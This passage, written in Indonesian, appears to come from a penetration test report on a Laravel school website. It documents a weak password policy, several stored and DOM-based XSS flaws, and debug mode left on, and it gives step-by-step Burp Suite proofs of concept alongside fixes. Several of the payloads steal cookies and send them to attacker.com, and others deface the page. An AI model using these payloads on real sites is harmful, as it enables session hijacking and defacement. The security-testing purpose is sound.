3. Perhatian: Sistem seharusnya REJECT, tapi dengan policy min:6 saja:
    - "12345" akan ditolak (kurang dari minimum)
    - "123456" akan diterima (exactly 6)

**Langkah 7: Test Password Tanpa Kompleksitas**

1. Buat user dengan password berikut (semuanya hanya angka/huruf, tidak ada symbol):
    - "aaaaaa" - hanya huruf kecil
    - "AAAAAA" - hanya huruf besar
    - "111111" - hanya angka
    - "password" - kata yang jelas
2. Semua akan diterima karena tidak ada requirement untuk:
    - Mixed case (uppercase + lowercase)
    - Kombinasi dengan angka
    - Kombinasi dengan symbol

**Langkah 8: Burp Repeater Testing (Multiple Tests)**

1. Copy request POST create user ke Repeater
2. Edit berbagai kombinasi password:
    ```
    Request 1: password=123456 → ACCEPTED
    Request 2: password=12345 → REJECTED (too short)
    Request 3: password=aaaaaa → ACCEPTED (no complexity check)
    Request 4: password=password → ACCEPTED (no complexity check)
    Request 5: password=admin → ACCEPTED (4 chars saja tapi jika 6+ akan ok seperti "admin12")
    ```
3. Setiap kali ubah password di form, klik "Send"
4. Response akan menunjukkan 302 (success) atau error message

**Langkah 9: Post-Create User Verification**

1. Logout dari admin
2. Coba login dengan user baru dan password lemah yang baru saja dibuat
3. Login dengan "testuser" / "123456" akan berhasil
4. Ini membuktikan password lemah bisa langsung digunakan

**Langkah 10: Check Database (Optional)**

1. Jika punya akses database atau terminal, bisa cek tabel users:
    ```sql
    SELECT username, password FROM users WHERE username='testuser';
    ```
2. Password akan ter-hash (tidak plain text), tapi hash dari password lemah "123456" tetap tidak aman

**Hasil**:

- Password hanya memerlukan 6 karakter minimum
- Tidak ada requirement untuk kompleksitas (uppercase, lowercase, numbers, symbols)
- Tidak ada requirement untuk panjang yang lebih panjang (seperti 12+ karakter)
- Password seperti "123456" atau "aaaaaa" atau "xxxxxx" diterima tanpa masalah
- Akun admin/user dengan password lemah mudah di-crack atau di-brute force
- V-07 terbukti valid: Password policy terlalu permissif

#### Dampak Jika Dibiarkan

- Akun mudah diambil alih.
- Risiko kebocoran data meningkat.
- Password policy tidak memenuhi praktik aman.

#### Mitigasi Before-After

Before:

```php
'password' => 'required|min:6',
```

After:

```php
use Illuminate\Validation\Rules\Password;

'password' => ['required', Password::min(12)->mixedCase()->letters()->numbers()->symbols()],
```

### V-08. Stored XSS pada Halaman About

**Severity**: High  
**OWASP**: A03 Injection

#### Deskripsi Kerentanan

Konten halaman about dirender menggunakan output mentah. Jika input tidak disanitasi, script yang disimpan akan dieksekusi saat halaman dibuka.

#### Bukti Kode

```blade
{!! $page->content !!}
```

Lokasi: [resources/views/frontend/about.blade.php](resources/views/frontend/about.blade.php)

#### Kenapa Ini Valid Vulnerability

- Output HTML tidak di-escape.
- Konten berasal dari input yang bisa diubah dari panel admin.
- Memungkinkan stored XSS terhadap pengunjung.

#### Evidence yang Diambil

- Bukti blade dengan output raw.
- Payload yang disimpan pada konten.
- Alert/eksekusi script di halaman front-end.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Akses Halaman Edit About (Tentang)**

1. Login sebagai admin
2. Navigasi ke menu Management Halaman atau Edit Halaman "Tentang" (`/admin/pages/edit/about` atau sejenisnya)
3. Atau cari halaman "About" dalam list halaman publik yang bisa diedit admin
4. Pastikan Burp Proxy Intercept aktif

**Langkah 2: Identifikasi Field Content Kosong**

1. Di form edit halaman about, Anda akan melihat field yang berisi konten HTML/text
2. Field ini mungkin named "content", "description", atau "body"
3. Field ini menggunakan rich text editor atau textarea biasa
4. Kode blade yang rentan: `{!! $page->content !!}` artinya konten di-render tanpa escape

**Langkah 3: Siapkan Payload XSS**

1. Buat beberapa payload XSS yang akan ditest:
    - **Simple Alert**: `<script>alert('XSS Vulnerability Found!');</script>`
    - **Cookie Stealer**: `<script>fetch('http://attacker.com/log?cookie=' + document.cookie);</script>`
    - **Image onerror**: `<img src=x onerror="alert('XSS from img tag')">`
    - **SVG**: `<svg onload="alert('XSS from SVG')">`
    - **Iframe**: `<iframe src="javascript:alert('XSS')"></iframe>`

**Langkah 4: Insert XSS Payload ke Content Field**

1. Pilih payload yang paling simple untuk test pertama: `<script>alert('XSS Vulnerability Found on About Page!');</script>`
2. Jika field content memiliki text editor visual, cari tombol "HTML" atau "Source" untuk mode raw
3. Atau jika textarea biasa, langsung paste ke field content
4. Contoh: Field sebelumnya berisi "Halaman tentang sekolah kami...", sekarang isi dengan payload
5. Full content: `Halaman tentang sekolah kami.<script>alert('XSS Vulnerability Found!');</script>`

**Langkah 5: Intercept Save Request**

1. Setelah paste payload, klik tombol "Save" atau "Update"
2. Request akan di-pause di Burp Interceptor
3. Lihat POST request:

    ```
    POST /admin/pages/about/update HTTP/1.1
    Host: localhost:8000
    Content-Type: application/x-www-form-urlencoded

    content=<script>alert('XSS Vulnerability Found!');</script>&title=About&_method=PUT
    ```

4. Payload XSS terlihat dengan jelas dalam POST body

**Langkah 6: Forward Request tanpa Modifikasi**

1. Klik "Forward" di Burp
2. Response akan menunjukkan success dan redirect:
    ```
    HTTP/1.1 302 Found
    Location: /admin/pages
    ```
3. Payload berhasil disimpan ke database

**Langkah 7: Akses Halaman Front-End untuk Trigger XSS**

1. Logout dari admin atau buka halaman dalam tab/window baru
2. Navigasi ke URL publik halaman About: `http://localhost:8000/tentang` atau `/about`
3. Halaman akan load dengan konten yang berisi script
4. Karena kode blade menggunakan `{!! $page->content !!}` (raw output tanpa escape), script akan dieksekusi
5. **Alert box akan muncul automaticamente**: "XSS Vulnerability Found on About Page!"

**Langkah 8: Inspect HTML Source**

1. Di browser (setelah alert disappear), buka "View Page Source" (Ctrl+U)
2. Cari konten halaman dan lihat script tag tersimpan:
    ```html
    <div class="page-content">
        Halaman tentang sekolah kami.
        <script>
            alert("XSS Vulnerability Found!");
        </script>
    </div>
    ```
3. Script terlihat dalam HTML mentah, bukan ter-escape

**Langkah 9: Test Payload Alternatif (IMG Tag)**

1. Kembali ke form edit about
2. Buat request baru dengan payload berbeda: `<img src=x onerror="alert('Image XSS')">`
3. Intercept, forward, dan kunjungi halaman publik
4. Alert akan muncul dari img onerror

**Langkah 10: Test Advanced Payload (Cookie Stealer Simulation)**

1. Gunakan payload yang mensimulasikan pencurian cookie:
    ```html
    <img src="x" onerror="console.log('Cookies: ' + document.cookie)" />
    ```
2. Saved dan load halaman publik
3. Buka browser console (F12 → Console tab)
4. Lihat log "Cookies: laravel_session=xxx" ter-print
5. Ini menunjukkan setiap pengunjung akan log-nya bisa diakses oleh attacker

**Langkah 11: Verify Data Stored in Database**

1. Jika punya database access, query halaman:
    ```sql
    SELECT * FROM pages WHERE slug='about';
    ```
2. Field content akan berisi script tag mentah, stored dalam database

**Langkah 12: Test Persistence**

1. Logout sepenuhnya
2. Buka halaman about lagi di incognito/private window
3. Alert akan muncul lagi - membuktikan XSS tersimpan (stored), bukan temporary
4. Setiap pengunjung yang membuka halaman about akan melihat alert

**Hasil Vulnerability**:

- Payload XSS dapat disimpan melalui form edit halaman
- Script tersimpan dalam database dan dalam HTML halaman publik
- Setiap kali halaman diakses, script otomatis dieksekusi di browser pengunjung
- Tidak hanya admin yang terpengaruh, tapi semua pengunjung publik situs
- V-08 terbukti valid: Stored XSS pada halaman About

#### Dampak Jika Dibiarkan

- Cookie atau session user dapat dicuri.
- Konten situs dapat dimanipulasi.
- Kepercayaan pengguna terhadap situs menurun.

#### Mitigasi Before-After

Before:

```blade
{!! $page->content !!}
```

After:

```blade
{{ $page->content }}
```

Jika rich text tetap dibutuhkan, lakukan sanitasi HTML whitelist sebelum render.

### V-09. Stored XSS pada Halaman Academic

**Severity**: High  
**OWASP**: A03 Injection

#### Deskripsi Kerentanan

Halaman akademik juga menampilkan konten mentah yang tidak di-escape.

#### Bukti Kode

```blade
{!! $page->content !!}
```

Lokasi: [resources/views/frontend/academic.blade.php](resources/views/frontend/academic.blade.php)

#### Kenapa Ini Valid Vulnerability

- Pola render identik dengan halaman about.
- Konten dapat disisipi script berbahaya.
- Menjadi stored XSS pada halaman publik.

#### Evidence yang Diambil

- Blade output raw.
- Payload pada field konten.
- Eksekusi script ketika halaman dibuka.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Akses Halaman Edit Academic (Akademik)**

1. Login sebagai admin
2. Navigasi ke menu Edit Halaman "Akademik" (`/admin/pages/edit/academic` atau sejenisnya)
3. Atau buka halaman "Academic" dalam list halaman yang dapat diedit
4. Pastikan Burp Interceptor aktif

**Langkah 2: Temukan Field Content**

1. Di form edit akademik, lihat field content/description yang berisi deskripsi akademik
2. Kode blade yang rentan juga: `{!! $page->content !!}` (sama seperti V-08)
3. Field ini menggunakan rich text editor atau textarea

**Langkah 3: Siapkan XSS Payload untuk Academic**

1. Gunakan payload XSS yang menarik untuk halaman akademik:
    - `<script>alert('XSS pada halaman akademik - silakan update konten!');</script>`
    - `<img src=x onerror="alert('Akademik page dilindungi - Admin: Update content segera!')">`
    - Atau lebih advanced: `<img src=1 onerror="document.body.innerHTML='<h1>SITE DEFACED</h1><p>Akademik page diambil alih</p>'">`

**Langkah 4: Clear Existing Content dan Insert Payload**

1. Jika field sudah ada konten sebelumnya, Anda bisa:
    - Ganti seluruhnya dengan payload (untuk clear test)
    - Atau append payload: `[existing content]<img src=x onerror="alert('XSS')">`
2. Contoh:

    ```
    Akademik SMP Islam Baabussalaam

    <script>
    var msg = "XSS Payload Executed! Setiap pengunjung bisa di-attack di halaman ini.";
    alert(msg);
    console.warn(msg);
    </script>
    ```

**Langkah 5: Trigger Save dan Intercept**

1. Klik "Save" atau "Update" button
2. Request akan di-pause di Burp
3. Lihat POST request dengan payload dalam field content:

    ```
    POST /admin/pages/academic/update HTTP/1.1
    Content-Type: application/x-www-form-urlencoded

    title=Akademik&content=[encoded XSS payload]&_method=PUT
    ```

**Langkah 6: Forward dan Verify**

1. Klik "Forward"
2. Response: `HTTP/1.1 302 Found Location: /admin/pages`
3. Perubahan berhasil disimpan

**Langkah 7: Test XSS via Public Akademik Page**

1. Buka halaman publik akademik: `http://localhost:8000/akademik`
2. Halaman akan load dan script akan langsung dieksekusi
3. Alert akan muncul secara otomatis sebelum konten terlihat

**Langkah 8: Check Browser Console**

1. Jika payload menggunakan `console.warn()` atau `console.log()`, buka F12 → Console
2. Lihat message di console yang menunjukkan script ter-execute
3. Ini membuktikan script berjalan dengan privilege halaman (bisa akses cookie, DOM, dll)

**Langkah 9: Test HTML Injection lebih Lanjut**

1. Buat request kedua dengan payload modifikasi:
    ```html
    <h1 style="color:red;">⚠️ HALAMAN INI TELAH DI-DEFACE ⚠️</h1>
    <p style="background-color:yellow; padding:10px;">
        Halaman akademik dilindungi dan telah diambil alih oleh attacker.
    </p>
    <script>
        // Redirect pengunjung ke halaman phishing atau malware
        // window.location = 'http://attacker.com/malware.html';
    </script>
    ```
2. Save melalui Burp (intercept & forward)
3. Buka halaman akademik, seluruh konten akan berganti dengan message defacement

**Langkah 10: Verify Persistence Across Browsers**

1. Logout sepenuhnya dari aplikasi
2. Buka inkognito/private window (atau browser berbeda)
3. Akses `http://localhost:8000/akademik` tanpa login
4. Alert/payload akan tetap muncul untuk pengunjung publik
5. Ini bukan temporary - stored XSS persisten

**Langkah 11: Test Multiple Payloads Accumulation**

1. Edit halaman akademik berkali-kali dengan payload berbeda
2. Setiap payload akan di-append atau replace
3. Jika di-append, bisa jadi ada multiple script di halaman (DOM bloat)
4. Setiap script akan dieksekusi in order

**Langkah 12: Demonstrate Real Attack Scenario**

1. Gunakan payload yang lebih mendekati attack real:
    ```html
    <img
        src="x"
        onerror="
      fetch('http://attacker.com/log', {
        method: 'POST',
        body: JSON.stringify({
          cookie: document.cookie,
          url: window.location.href,
          referrer: document.referrer,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        })
      });
      alert('Thank you for visiting! Your session is being analyzed...');
    "
    />
    ```
2. Ini menunjukkan bahwa attacker bisa mengumpulkan data dari semua pengunjung

**Hasil Vulnerability**:

- XSS payload dapat disimpan pada halaman akademik melalui form edit admin
- Payload dieksekusi untuk setiap pengunjung publik halaman
- Tidak ada perbedaan antara V-08 dan V-09 - keduanya stored XSS dengan mechanism sama
- V-09 terbukti valid: Stored XSS pada halaman Academic yang sama efektifnya dengan V-08

#### Dampak Jika Dibiarkan

- Serangan ke pengunjung situs menjadi mungkin.
- Potensi defacement dan pencurian data sesi.
- Risiko reputasi sekolah meningkat.

#### Mitigasi Before-After

Before:

```blade
{!! $page->content !!}
```

After:

```blade
{{ $page->content }}
```

### V-10. DOM XSS pada Preview Halaman Admin

**Severity**: High  
**OWASP**: A03 Injection

#### Deskripsi Kerentanan

Preview halaman menggunakan `innerHTML` untuk menampilkan konten dari `dataset.content`. Jika konten berisi HTML aktif, script dapat dieksekusi di browser admin.

#### Bukti Kode

```javascript
document.getElementById("preview-content").innerHTML = btn.dataset.content;
```

Lokasi: [resources/views/admin/halaman/index.blade.php](resources/views/admin/halaman/index.blade.php)

#### Kenapa Ini Valid Vulnerability

- Input dari database dimasukkan ke DOM secara mentah.
- `innerHTML` mengeksekusi HTML aktif.
- Ini adalah DOM-based XSS yang jelas.

#### Evidence yang Diambil

- Source code JS.
- Payload tersimpan pada data halaman.
- Script aktif ketika preview dibuka.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Akses Admin Halaman List**

1. Login sebagai admin
2. Navigasi ke Management Halaman/Pages admin (`/admin/pages` atau `/admin/halaman`)
3. Akan melihat list halaman yang lebih ringkas dari detail edit
4. Pastikan Burp Proxy aktif

**Langkah 2: Identifikasi Preview Button**

1. Di list halaman, setiap row petugas akan memiliki tombol "Preview" atau "Lihat Preview"
2. Preview button biasanya berada di kolom aksi (rightmost)
3. Kode JavaScript dari halaman index menggunakan:
    ```javascript
    document.getElementById("preview-content").innerHTML = btn.dataset.content;
    ```
4. Ini adalah DOM-based XSS karena data dari dataset langsung di-inject ke innerHTML

**Langkah 3: Prepare XSS Payload dalam Database**

1. Buat/Edit halaman baru untuk test
2. Navigasi ke form create/edit halaman
3. Isi dengan:
    - Title: "Test Page XSS"
    - Content: `<img src=x onerror="alert('DOM XSS dari Preview Halaman!')">`
4. Save melalui Burp (intercept & forward)

**Langkah 4: Return to List View**

1. Setelah save, Anda akan redirect ke list halaman: `/admin/halaman`
2. Cari halaman yang baru saja dibuat ("Test Page XSS")

**Langkah 5: Inspect Dataset Attribute**

1. Di browser, buka Halaman list halaman dengan F12 (Developer Tools)
2. Tab Elements/Inspector, cari tombol preview untuk halaman test
3. Lihat atribut dalam HTML button:
    ```html
    <button
        type="button"
        class="btn btn-sm btn-info"
        id="preview-btn-123"
        data-title="Test Page XSS"
        data-content="<img src=x onerror=&quot;alert('DOM XSS')&quot;>"
        onclick="showPreview(this)"
    >
        Preview
    </button>
    ```
4. `data-content` berisi XSS payload dalam encoded form

**Langkah 6: Click Preview Button**

1. Klik tombol "Preview" untuk halaman test
2. Modal akan pop-up menampilkan preview halaman
3. Di dalam modal, JavaScript mengeksekusi:
    ```javascript
    document.getElementById("preview-content").innerHTML = btn.dataset.content;
    ```
4. Payload dalam dataset akan di-render sebagai HTML
5. **Alert akan muncul**: "DOM XSS dari Preview Halaman!"

**Langkah 7: Verify Payload Berasal dari Database**

1. Di browser console (F12), jalankan query untuk lihat dataset:
    ```javascript
    var btn = document.getElementById("preview-btn-123");
    console.log(btn.dataset.content);
    // Output: <img src=x onerror="alert('DOM XSS dari Preview Halaman!')">
    ```
2. Ini membuktikan data berasal dari database/backend, bukan hardcoded di frontend

**Langkah 8: Advanced Payload - Steal Session**

1. Buat halaman baru dengan payload:
    ```html
    <img
        src="x"
        onerror="document.location='http://attacker.com/log.php?session='+document.cookie"
    />
    ```
2. Save halaman
3. Kembali ke list → Klik Preview
4. JavaScript akan menjalankan `document.location` yang redirect attacker ke log URL dengan cookie

**Langkah 9: Burp Intercept alternative**

1. Jika ingin test via Burp Repeater, bisa intercept GET request preview:
    ```
    GET /admin/halaman HTTP/1.1
    ```
2. Response HTML akan berisi data-content dengan XSS payload
3. Lihat bagian response:
    ```html
    data-content="<img src="x" onerror='alert("test")' />"
    ```

**Langkah 10: Compare dengan Escaped Version**

1. Jika code di-fix menggunakan `textContent` alih-alih `innerHTML`:
    ```javascript
    document.getElementById("preview-content").textContent =
        btn.dataset.content;
    ```
2. Maka `<img src=x onerror=alert()>` akan ditampilkan sebagai text biasa, bukan HTML
3. Alert tidak akan muncul - DOM XSS ter-prevent

**Langkah 11: Test Multiple Halaman**

1. Buat beberapa halaman dengan payload berbeda:
    - Halaman 1: `<svg onload="alert('SVG XSS')">`
    - Halaman 2: `<iframe src="javascript:alert('Iframe XSS')">`
    - Halaman 3: `<body onload="alert('Body XSS')">`
2. Preview masing-masing, semua akan trigger alert

**Langkah 12: Persistence Proof**

1. Close modal preview
2. Refresh halaman list
3. Preview lagi halaman yang sama
4. Alert akan muncul lagi - membuktikan DOM XSS persistent untuk data stored

**Hasil Vulnerability**:

- halaman dengan content XSS tersimpan di database
- Saat preview di-klik, JavaScript mengambil data dari dataset attribute
- innerHTML render payload sebagai HTML aktif
- Admin panel menjadi rentan terhadap stored XSS yang trigger via preview
- V-10 terbukti valid: DOM XSS pada Preview Halaman Admin

#### Dampak Jika Dibiarkan

- Admin panel dapat diserang melalui stored payload.
- Session admin bisa dibajak.
- Pengambilalihan kontrol backend menjadi lebih mudah.

#### Mitigasi Before-After

Before:

```javascript
document.getElementById("preview-content").innerHTML = btn.dataset.content;
```

After:

```javascript
document.getElementById("preview-content").textContent = btn.dataset.content;
```

### V-11. DOM XSS pada Preview Guru/Staff

**Severity**: High  
**OWASP**: A03 Injection

#### Deskripsi Kerentanan

Preview data guru/staff membangun HTML string dari input user dan langsung menaruhnya ke `innerHTML`.

#### Bukti Kode

```javascript
document.getElementById("preview-body").innerHTML = html;
```

Lokasi: [resources/views/admin/guru/index.blade.php](resources/views/admin/guru/index.blade.php)

#### Kenapa Ini Valid Vulnerability

- Data user diperlakukan sebagai HTML.
- Semua field preview berpotensi berisi payload aktif.
- Mudah dibuktikan lewat preview modal.

#### Evidence yang Diambil

- JavaScript preview yang raw.
- Payload pada field seperti name atau position.
- Eksekusi script pada modal preview.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Akses Admin Guru/Staff List**

1. Login sebagai admin
2. Navigasi ke Management Guru/Staff (`/admin/guru` atau `/admin/teachers`)
3. Akan melihat list guru/staff dengan aksi buttons
4. Aktifkan Proxy Intercept

**Langkah 2: Identifikasi Preview Modal untuk Guru**

1. Di list guru, setiap row memiliki tombol "Preview" atau "Lihat"
2. Kode vulnerable:
    ```javascript
    document.getElementById("preview-body").innerHTML = html;
    ```
    dimana `html` adalah string yang dibangun dari field guru yang ada di table row
3. Semua field guru (name, position, phone, dsb) berpotensi berisi XSS

**Langkah 3: Siapkan Guru with XSS Payload**

1. Akses form create guru baru: `/admin/guru/create`
2. Isi field:
    - Nama: `<img src=x onerror="alert('XSS Guru')">`
    - Posisi/Jabatan: "Guru Matematika"
    - Agama/Other fields: isi biasa
3. Atau jika edit guru existing, ubah field nama dengan payload
4. Save dengan intercept Burp

**Langkah 4: Return to Guru List**

1. Setelah save, kembali ke list guru
2. Cari guru dengan nama yang baru dibuat (akan terlihat sebagai HTML entities atau raw text)

**Langkah 5: Inspect Button Element**

1. Buka Developer Tools (F12) → Elements tab
2. Cari row guru baru, lihat button "Preview"
3. Perhatikan struktur HTML dalam data attribute atau table cell

**Langkah 6: Click Preview Guru**

1. Klik tombol preview untuk guru dengan XSS payload
2. Modal akan pop-up menampilkan preview guru
3. JavaScript function mengeksekusi:
    ```javascript
    var btn = this;
    var html = `
      <h6>${btn.dataset.name}</h6>
      <p>Posisi: ${btn.dataset.position}</p>
      ...
    `;
    document.getElementById("preview-body").innerHTML = html;
    ```
4. **Alert akan muncul**: "XSS Guru"
5. Dialog alert membuktikan script ter-execute di browser

**Langkah 7: Test Multiple Fields**

1. Edit guru lagi, kali ini ubah field "posisi" dengan payload:
    - Posisi: `<img src=x onerror="alert('XSS dalam Posisi')">`
    - Nama: "Guru Test" (biasa saja)
2. Save dan preview lagi
3. Alert akan muncul karena field posisi juga di-render ke innerHTML

**Langkah 8: Advanced Payload - Inject HTML Content**

1. Edit guru, ubah nama dengan:
    ```html
    <div style="background-color:red;padding:20px;color:white;">
        <h2>⚠️ PERHATIAN ADMIN</h2>
        <p>
            Data guru ini telah dimodifikasi oleh attacker. Grade sistem ini
            rusak.
        </p>
    </div>
    ```
2. Save dan preview
3. Modal akan menampilkan div alert dengan styling yang mengganggu
4. Ini menunjukkan innerHTML vulnerability bisa digunakan untuk content manipulation

**Langkah 9: Test Cookie Stealing via Guru Preview**

1. Guru dengan payload:
    ```html
    <img
        src="x"
        onerror="
      var img = new Image();
      img.src = 'http://attacker.com/steal.php?cookie=' + encodeURIComponent(document.cookie);
    "
    />
    ```
2. Save dan preview
3. Browser akan mengirim request ke attacker dengan cookie admin terintegrasi

**Langkah 10: Verify Data dari Database**

1. Di browser console, check apa yang ada di dataset:
    ```javascript
    var allButtons = document.querySelectorAll(".preview-btn");
    allButtons.forEach((btn) => {
        console.log("Guru:", btn.dataset.name);
        console.log("Data HTML:", btn.dataset.html);
    });
    ```
2. Lihat semua guru data dari row dalam console log

**Langkah 11: Test Trigger via Burp**

1. Jika ingin test lebih controlled, intercept GET request untuk list guru:
    ```
    GET /admin/guru HTTP/1.1
    ```
2. Di response body, cari dataset attribute guru:
    ```html
    data-name="<img src="x" onerror="alert()" />" data-position="..."
    data-html="[encoded HTML]"
    ```
3. Lihat response bagaimana XSS payload ter-encode dalam HTML

**Langkah 12: Repeat with Different Fields**

1. Test XSS di field-field lain guru (alamat, nomor telepon, email, dsb)
2. Setiap field yang di-render via innerHTML bisa menjadi XSS vector
3. Setiap preview akan trigger script jika field berisi XSS payload

**Hasil Vulnerability**:

- Data guru disimpan di database tanpa sanitasi
- Preview button membangun HTML string dari database fields
- `innerHTML` render string sebagai HTML aktif, mengeksekusi script
- Admin bisa menjadi korban XSS saat preview guru dengan payload
- V-11 terbukti valid: DOM XSS pada Preview Guru/Staff

#### Dampak Jika Dibiarkan

- Admin dapat menjadi korban XSS melalui data internal.
- Kebocoran token/session dapat terjadi.
- Keamanan panel admin melemah.

#### Mitigasi Before-After

Before:

```javascript
document.getElementById("preview-body").innerHTML = html;
```

After:

```javascript
const previewBody = document.getElementById("preview-body");
previewBody.innerHTML = "";
previewBody.appendChild(
    Object.assign(document.createElement("h6"), {
        textContent: btn.dataset.name,
    }),
);
```

Gunakan `textContent` untuk semua field lain.

### V-12. DOM XSS pada Preview Fasilitas

**Severity**: Medium  
**OWASP**: A03 Injection

#### Deskripsi Kerentanan

Field features dipecah lalu digabung menjadi HTML dengan `innerHTML`. Jika ada payload aktif, browser akan mengeksekusinya.

#### Bukti Kode

```javascript
document.getElementById("preview-features").innerHTML = f
    .map(
        (x) =>
            `<p class='mb-0'><i class='fas fa-check text-success me-1'></i>${x.trim()}</p>`,
    )
    .join("");
```

Lokasi: [resources/views/admin/fasilitas/index.blade.php](resources/views/admin/fasilitas/index.blade.php)

#### Kenapa Ini Valid Vulnerability

- Data user dimasukkan ke HTML string.
- Tidak ada escaping sebelum render.
- DOM XSS dapat dipicu dari preview modal.

#### Evidence yang Diambil

- Script preview fasilitas.
- Input features berbahaya.
- Eksekusi script di modal.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Akses Admin Fasilitas List**

1. Login sebagai admin
2. Navigasi ke Management Fasilitas (`/admin/fasilitas` atau `/admin/facilities`)
3. Lihat list fasilitas dalam table format
4. Aktifkan Burp Proxy Intercept

**Langkah 2: Identifikasi Preview untuk Fasilitas**

1. Setiap row fasilitas memiliki tombol Preview atau Lihat
2. Kode vulnerable menampilkan field "features":
    ```javascript
    document.getElementById("preview-features").innerHTML = f
        .map(
            (x) =>
                `<p class='mb-0'><i class='fas fa-check text-success me-1'></i>${x.trim()}</p>`,
        )
        .join("");
    ```
3. Field "features" biasanya berupa list yang dipisahkan dengan break/koma
4. Setiap item feature di-render ke innerHTML, sehingga XSS payload bisa di-inject

**Langkah 3: Buat Fasilitas dengan XSS Payload**

1. Create fasilitas baru: `/admin/fasilitas/create`
2. Isi field:
    - Nama: "Lab Komputer"
    - Deskripsi: "Laboratorium untuk pembelajaran"
    - Features (field yang rentan):
        ```
        <img src=x onerror="alert('XSS Fasilitas Feature 1')">
        Akses Internet Gratis
        Proyektor dan Layar
        ```
        Atau jika field berupa textarea dengan separator, isi:
        ```
        <img src=x onerror="alert('Feature XSS')">|Akses Gratis|Proyektor
        ```
3. Bergantung format field, isi dengan payload di tengah feature list

**Langkah 4: Save Fasilitas**

1. Klik tombol "Save" atau "Simpan"
2. Intercept di Burp
3. Lihat POST request dengan features berisi XSS:
    ```
    POST /admin/fasilitas HTTP/1.1
    features=<img src=x onerror="alert('XSS Fasilitas Feature 1')">
    &features=Akses Internet Gratis
    &features=Proyektor dan Layar
    ```
    Atau dalam format lain tergantung struktur form

**Langkah 5: Forward Request**

1. Klik "Forward" di Burp
2. Response redirect ke list fasilitas

**Langkah 6: Return to Fasilitas List**

1. Navigasi kembali ke `/admin/fasilitas`
2. Cari fasilitas "Lab Komputer" yang baru saja dibuat

**Langkah 7: Click Preview**

1. Klik tombol Preview untuk fasilitas Lab Komputer
2. Modal akan membuka menampilkan preview fasilitas
3. JavaScript akan mengeksekusi:
    ```javascript
    var f = btn.dataset.features.split("|"); // atau method split lainnya
    document.getElementById("preview-features").innerHTML = f
        .map((x) => `<p>...${x.trim()}...</p>`)
        .join("");
    ```
4. **Alert akan muncul**: "Feature XSS"
5. Payload dalam feature list ter-execute

**Langkah 8: Test Multiple Features with Different Payloads**

1. Edit fasilitas, ubah features dengan:
    ```
    Feature Normal 1
    <img src=x onerror="alert('XSS Feature 2')">
    Feature Normal 2
    ```
2. Save dan preview
3. Alert akan muncul dari feature kedua
4. Ini menunjukkan XSS bisa di-injeksi di tengah list, tidak hanya awal

**Langkah 9: Advanced Payload - DOM Manipulation**

1. Edit features dengan payload:
    ```
    <img src=x onerror="
      document.getElementById('preview-features').innerHTML =
      '<h3 style=color:red;>FASILITAS TELAH DIHACKAN!</h3>';
    ">
    Feature Lainnya
    ```
2. Preview akan menampilkan custom message alih-alih list feature
3. Menunjukkan attacker bisa manipulate presenter content

**Langkah 10: Cookie-Stealing Payload dalam Features**

1. Feature dengan:
    ```
    <img src=x onerror="new Image().src='http://attacker.com/log.php?cookie='+document.cookie">
    Fasilitas Standar
    ```
2. Save dan preview untuk trigger payload
3. Attacker menerima request dengan admin cookie

**Langkah 11: Test Split/Join Behavior**

1. Jika field features menggunakan pemisah tertentu (newline, koma, pipe), test berbagai format:
    - Newline separator: payload di baris terpisah
    - Koma separator: payload diapit koma
    - Pipe separator: payload diapit pipe
2. Setiap variasi masih akan di-render via innerHTML

**Langkah 12: Verify Database Storage**

1. Database query:
    ```sql
    SELECT * FROM facilities WHERE name='Lab Komputer';
    ```
2. Field features akan berisi XSS payload mentah yang tersimpan

**Langkah 13: Persistence Testing**

1. Logout sepenuhnya
2. Login kembali
3. Buka fasilitas list → Preview fasilitas dengan XSS
4. Alert akan muncul lagi - membuktikan persistent DOM XSS

**Hasil Vulnerability**:

- Features field dari fasilitas berpotensi berisi XSS payload
- Saat preview di-klik, JavaScript split features dan render dengan innerHTML
- Setiap feature item diproses dan di-evaluate sebagai HTML
- XSS payload dalam features akan dieksekusi saat preview
- V-12 terbukti valid: DOM XSS pada Preview Fasilitas (Medium severity karena hanya admin yang terpengaruh direktly, tapi tetap serious untuk 3 vulnerabilities dengan pattern sama)

#### Dampak Jika Dibiarkan

- Preview admin menjadi vektor serangan.
- Token sesi admin dapat dicuri.
- Data fasilitas dapat menjadi channel injeksi.

#### Mitigasi Before-After

Before:

```javascript
document.getElementById("preview-features").innerHTML = f
    .map(
        (x) =>
            `<p class='mb-0'><i class='fas fa-check text-success me-1'></i>${x.trim()}</p>`,
    )
    .join("");
```

After:

```javascript
const container = document.getElementById("preview-features");
container.innerHTML = "";
f.forEach((x) => {
    const p = document.createElement("p");
    p.textContent = x.trim();
    container.appendChild(p);
});
```

### V-13. Debug Mode Aktif

**Severity**: Medium  
**OWASP**: A05 Security Misconfiguration

#### Deskripsi Kerentanan

Environment masih menggunakan debug mode lokal. Pada kondisi tertentu, aplikasi akan menampilkan detail exception, stack trace, path file, dan informasi internal lain.

#### Bukti Kode

```env
APP_ENV=local
APP_DEBUG=true
SESSION_ENCRYPT=false
```

Lokasi: [.env](.env)

#### Kenapa Ini Valid Vulnerability

- Debug mode membuka informasi internal.
- Path aplikasi, query, dan error detail dapat terlihat.
- Menambah kemudahan attacker untuk reconnaissance.

#### Evidence yang Diambil

- Nilai `APP_DEBUG=true` pada `.env`.
- Response error yang menampilkan detail internal.
- Informasi path atau stack trace bila error dipicu.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Analyze Environment File**

1. Akses server/workspace dimana aplikasi di-host (misal via SSH atau direct file access)
2. Buka file `.env` di root aplikasi Laravel
3. Di Burp, kurang relevan untuk VI-13 karena ini konfigurasi server, tapi kita bisa lihat dampaknya via responses

**Langkah 2: Lihat Current .env Settings**

1. View file `.env`:
    ```env
    APP_ENV=local
    APP_DEBUG=true
    APP_KEY=base64:xxxxx
    SESSION_ENCRYPT=false
    ```
2. Dua setting yang vulnerable:
    - `APP_DEBUG=true` - Menampilkan detailed error pages
    - `APP_ENV=local` - Environment masih lokal, bukan production

**Langkah 3: Trigger Error untuk Test**

1. Di browser, akses URL dengan query parameter yang invalid atau trigger error:
    - Misalnya: `http://localhost:8000/test-404` (route yang tidak ada)
    - Atau: `http://localhost:8000/api/invalid-endpoint` (endpoint invalid)
